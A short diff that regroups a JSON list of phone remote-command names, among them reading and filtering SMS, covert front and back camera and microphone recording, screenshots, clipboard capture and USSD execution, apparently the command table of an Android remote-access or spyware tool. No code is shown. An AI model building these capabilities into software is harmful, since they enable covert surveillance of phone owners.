@@ -3,12 +3,14 @@
         "openUrl", "sendToast", "vibratePhone",
         "getGeoLocation", "receiveSMS",
         "getInstalledApps",
-        "lockScreen", "unlockScreen",
-        "runUSSD"
+        "lockScreen", "unlockScreen", "runUSSD"
     ],
     [
-        "getAllSMS", "takeScreenshot", "takeBackshot", "takeFrontshot", "setSoundVolume",
-        "recordFront", "recordBack", "recordMicrophone", "getPhoneNumbers", "getPhoneNumberInfo",
-        "sendSMS", "setSMSFilter", "removeSMSFilter", "getClipboard"
+        "getAllSMS", "takeScreenshot", "takeBackshot", "takeFrontshot",
+        "recordFront", "recordBack", "recordMicrophone", "getClipboard"
+    ],
+    [
+        "setSoundVolume", "sendSMS",
+        "setSMSFilter", "removeSMSFilter"
     ]
 ]
